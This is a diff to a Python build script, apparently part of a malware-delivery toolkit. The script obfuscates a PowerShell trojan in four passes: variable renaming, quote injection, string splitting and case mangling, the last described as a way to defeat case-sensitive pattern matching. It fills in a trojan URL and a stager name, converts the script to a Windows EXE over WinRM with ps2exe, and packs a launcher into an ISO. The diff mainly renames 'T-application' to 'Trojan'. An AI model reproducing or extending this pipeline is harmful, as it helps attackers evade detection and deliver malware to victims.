@@ -276,12 +276,12 @@ def obfuscate_ps_commands(content: str, ps_cmd_file: str) -> str:
 
 
 # ==============================================================================
-# OBFUSCATION — PASS 3 (T-application only): String concatenation split
+# OBFUSCATION — PASS 3 (Trojan only): String concatenation split
 # ==============================================================================
 
 def obfuscate_string_concat(content: str) -> str:
     """
-    Pass 3 — String concatenation split (applied to T-application only).
+    Pass 3 — String concatenation split (applied to Trojan only).
 
     Splits double-quoted string literals by inserting a '+' concatenation
     operator at a random position:
@@ -346,12 +346,12 @@ def obfuscate_string_concat(content: str) -> str:
 
 
 # ==============================================================================
-# OBFUSCATION — PASS 4 (T-application only): Random case mangling of keywords
+# OBFUSCATION — PASS 4 (Trojan only): Random case mangling of keywords
 # ==============================================================================
 
 def obfuscate_case_mangle(content: str, ps_cmd_file: str) -> str:
     """
-    Pass 4 — Case mangling (applied to T-application only).
+    Pass 4 — Case mangling (applied to Trojan only).
 
     PowerShell is case-insensitive, so randomly alternating the case of each
     character in a keyword defeats case-sensitive pattern matching.
@@ -416,13 +416,13 @@ def full_obfuscation_pipeline(content: str, label: str) -> str:
 
 
 # ==============================================================================
-# OBFUSCATION PIPELINE — EXTENDED (used by step 6 for T-application)
+# OBFUSCATION PIPELINE — EXTENDED (used by step 6 for Trojan)
 # ==============================================================================
 
 def full_obfuscation_pipeline_extended(content: str, label: str) -> str:
     """
     Extended 4-pass obfuscation pipeline applied exclusively to the
-    T-application (TROJANNAME).
+    Trojan (TROJANNAME).
 
     Pass 1 — Variable renaming (UUID hex tokens)
     Pass 2 — PS command '' injection (single-quote pairs only)
@@ -841,25 +841,25 @@ def step5_create_zip():
 
 
 # ==============================================================================
-# STEP 6 — T-APPLICATION OBFUSCATION
+# STEP 6 — Trojan OBFUSCATION
 # ==============================================================================
 
 def step6_obfuscate_trojan():
     """
-    STEP 6: Obfuscate the T-application (TROJANNAME).
+    STEP 6: Obfuscate the Trojan (TROJANNAME).
 
     Actions performed:
       6a. Copy TROJAN_FE and TROJANNAME from stuff/ to out/.
       6b. Substitute placeholders: [TROJAN-URL], [TROJAN_FE], [STAGERNAME].
       6c. Apply the extended 4-pass obfuscation pipeline on TROJANNAME.
     """
-    section("STEP 6 — T-Application Obfuscation")
+    section("STEP 6 — Trojan Obfuscation")
 
     trojan_fe_src  = os.path.join(STUFF_DIR, TROJAN_FE)
     trojan_fe_dest = os.path.join(OUT_DIR,   TROJAN_FE)
     if not os.path.isfile(trojan_fe_src):
         err(
-            f"T-application source file not found: {trojan_fe_src}\n"
+            f"Trojan source file not found: {trojan_fe_src}\n"
             f"Ensure '{TROJAN_FE}' exists inside the stuff/ directory."
         )
     info(f"Copying '{TROJAN_FE}' from stuff/ to out/ ...")
@@ -870,7 +870,7 @@ def step6_obfuscate_trojan():
     trojan_dest = os.path.join(OUT_DIR,   TROJANNAME)
     if not os.path.isfile(trojan_src):
         err(
-            f"T-application source file not found: {trojan_src}\n"
+            f"Trojan source file not found: {trojan_src}\n"
             f"Ensure '{TROJANNAME}' exists inside the stuff/ directory."
         )
     info(f"Copying '{TROJANNAME}' from stuff/ to out/ ...")
@@ -893,21 +893,21 @@ def step6_obfuscate_trojan():
     ok(f"Replaced {n_fe} occurrence(s) of [TROJAN_FE]   → '{TROJAN_FE}'.")
     ok(f"Replaced {n_stager} occurrence(s) of [STAGERNAME] → '{STAGERNAME}'.")
 
-    info("Starting EXTENDED obfuscation pipeline (4 passes) on T-application...")
+    info("Starting EXTENDED obfuscation pipeline (4 passes) on Trojan...")
     content = read_file(trojan_dest)
     content = full_obfuscation_pipeline_extended(content, label="trojan")
     write_file(trojan_dest, content)
 
-    ok(f"T-application obfuscation complete. Output: {trojan_dest}")
+    ok(f"Trojan obfuscation complete. Output: {trojan_dest}")
 
 
 # ==============================================================================
-# STEP 7 — T-APPLICATION PS1 → EXE CONVERSION VIA WINRM
+# STEP 7 — Trojan PS1 → EXE CONVERSION VIA WINRM
 # ==============================================================================
 
 def step7_convert_trojan_to_exe():
     """
-    STEP 7: Convert the obfuscated T-application PS1 to a Windows EXE via WinRM.
+    STEP 7: Convert the obfuscated Trojan PS1 to a Windows EXE via WinRM.
 
     Actions performed:
       7a. Check pywinrm availability; if missing → non-fatal error, skip step.
@@ -917,7 +917,7 @@ def step7_convert_trojan_to_exe():
       7e. Download resulting EXE to out/TROJANNAME.exe.
       7f. Clean up remote %TEMP% files.
     """
-    section("STEP 7 — T-Application PS1 → EXE Conversion via WinRM")
+    section("STEP 7 — Trojan PS1 → EXE Conversion via WinRM")
 
     trojan_local     = os.path.join(OUT_DIR, TROJANNAME)
     trojan_exe_name  = TROJANNAME + ".exe"
@@ -928,7 +928,7 @@ def step7_convert_trojan_to_exe():
         err_nonfatal(
             "The 'pywinrm' library is not installed. "
             "Run: pip install pywinrm\n"
-            f"  {RED_DARK}The T-application EXE ({trojan_exe_name}) will NOT be generated. "
+            f"  {RED_DARK}The Trojan EXE ({trojan_exe_name}) will NOT be generated. "
             f"Continuing...{RESET}"
         )
         return
@@ -951,7 +951,7 @@ def step7_convert_trojan_to_exe():
     except Exception as e:
         err_nonfatal(
             f"Could not connect to {WIN_IP} via WinRM: {e}\n"
-            f"  {RED_DARK}The T-application EXE ({trojan_exe_name}) will NOT be generated. "
+            f"  {RED_DARK}The Trojan EXE ({trojan_exe_name}) will NOT be generated. "
             f"Continuing...{RESET}"
         )
         return
@@ -1010,7 +1010,7 @@ def step7_convert_trojan_to_exe():
     except Exception as e:
         err_nonfatal(
             f"Failed to upload '{TROJANNAME}' to {WIN_IP}: {e}\n"
-            f"  {RED_DARK}The T-application EXE ({trojan_exe_name}) will NOT be generated. "
+            f"  {RED_DARK}The Trojan EXE ({trojan_exe_name}) will NOT be generated. "
             f"Continuing...{RESET}"
         )
         return
@@ -1034,7 +1034,7 @@ def step7_convert_trojan_to_exe():
             f"ps2exe conversion failed on {WIN_IP}: {e}\n"
             f"  {RED_DARK}Ensure ps2exe is installed on the Windows machine "
             f"(Install-Module ps2exe).\n"
-            f"  The T-application EXE ({trojan_exe_name}) will NOT be generated. "
+            f"  The Trojan EXE ({trojan_exe_name}) will NOT be generated. "
             f"Continuing...{RESET}"
         )
         session.run_ps(f"Remove-Item \"$env:TEMP\\{TROJANNAME}\" -Force -EA 0")
@@ -1058,7 +1058,7 @@ def step7_convert_trojan_to_exe():
     except Exception as e:
         err_nonfatal(
             f"Failed to download '{trojan_exe_name}' from {WIN_IP}: {e}\n"
-            f"  {RED_DARK}The T-application EXE will NOT be available locally. "
+            f"  {RED_DARK}The Trojan EXE will NOT be available locally. "
             f"Continuing...{RESET}"
         )
 
@@ -1161,10 +1161,10 @@ def step8_iso_creation():
         dest = os.path.join(iso_dir, LAUNCHERNAME)         
         if not os.path.exists(src):
             raise FileNotFoundError(f"{src} file does not exist!")
+        shutil.copy(src, dest)  
     except Exception:
         warn(f"Problems preparing files to be inserted into the ISO container.")
-    
-    shutil.copy(src, dest)
+  
     # --- Step 4: creare la ISO con xorriso ---
     iso_path = os.path.join(OUT_DIR, ISONAME)    
     try:
@@ -1222,15 +1222,15 @@ def main():
 
     trojan_path = os.path.join(OUT_DIR, TROJANNAME)
     if os.path.isfile(trojan_path):
-        info(f"T-application (PS1)   : {trojan_path}")
+        info(f"Trojan (PS1)          : {trojan_path}")
     else:
-        warn(f"T-application (PS1)   : not generated (see Step 6 output above)")
+        warn(f"Trojan (PS1)          : not generated (see Step 6 output above)")
 
-    trojan_exe_path = os.path.join(OUT_DIR, TROJANNAME + ".exe")
+    trojan_exe_path = os.path.join(OUT_DIR, ISONAME)
     if os.path.isfile(trojan_exe_path):
-        info(f"T-application (EXE)   : {trojan_exe_path}")
+        info(f"Trojan (ISO)          : {trojan_exe_path}")
     else:
-        warn(f"T-application (EXE)   : not generated (see Step 7 output above)")
+        warn(f"Trojan (ISO)          : not generated (see Step 7 output above)")
 
     print()
 
